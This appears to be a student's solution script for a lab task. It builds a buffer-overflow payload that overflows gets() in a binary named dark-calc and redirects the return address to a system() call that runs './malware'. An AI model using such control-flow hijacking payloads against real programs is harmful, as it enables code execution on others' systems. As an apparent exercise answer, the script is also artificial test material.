"""Task 1: build the payload for attack/dark-calc.

利用 input() 中 gets() 的栈溢出覆盖返回地址，跳过 eval() 的字符串拼接，
直接进入 eval() 里调用 system(command_buf) 的那几条指令执行我们输入的 "./malware"。
"""
import struct
import sys

# dark-calc: 0x401a6b = "mov $0x6030d0,%edi; call system@plt"
SYSTEM_CALL = 0x401A6B
# input() 的缓冲区在 rbp-0x10，返回地址在 rbp+8，因此偏移是 0x18
RET_OFFSET = 0x18

payload = b"./malware\x00"
payload += b"A" * (RET_OFFSET - len(payload))
payload += struct.pack("<Q", SYSTEM_CALL)
payload += b"\n"

sys.stdout.buffer.write(payload)
